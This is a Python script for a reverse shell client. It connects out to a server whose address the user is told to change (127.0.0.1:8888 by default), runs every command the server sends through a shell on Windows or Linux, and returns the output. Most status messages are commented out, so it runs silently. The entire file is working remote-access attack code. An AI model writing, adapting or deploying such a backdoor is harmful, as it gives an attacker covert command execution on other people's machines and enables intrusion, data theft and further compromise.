import socket
import threading
import platform
import subprocess
import os

def execute_command(command):
    if platform.system().lower() == "windows":
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.communicate()[0] + result.communicate()[1]
    else:
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, executable="/bin/bash")
        return result.communicate()[0] + result.communicate()[1]

def main():
    host = "127.0.0.1"  # Change this to your server's IP address
    port = 8888  # Use the same port number as the server

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    response = client_socket.recv(1024)
    #print(response.decode())

    receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
    receive_thread.start()

def receive_messages(client_socket):
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                #print("Server closed the connection.")
                break

            command = data.decode()  # Received command from the server
            result = execute_command(command)  # Execute the command
            client_socket.send(result.encode())  # Send the output back to the server

        except ConnectionError:
            #print("Error: Connection to the server lost.")
            break

        except subprocess.CalledProcessError as e:
            #print(f"Error executing command: {e}")
            break

        except Exception as e:
            #print(f"An unexpected error occurred: {e}")
            break

if __name__ == "__main__":
    main()
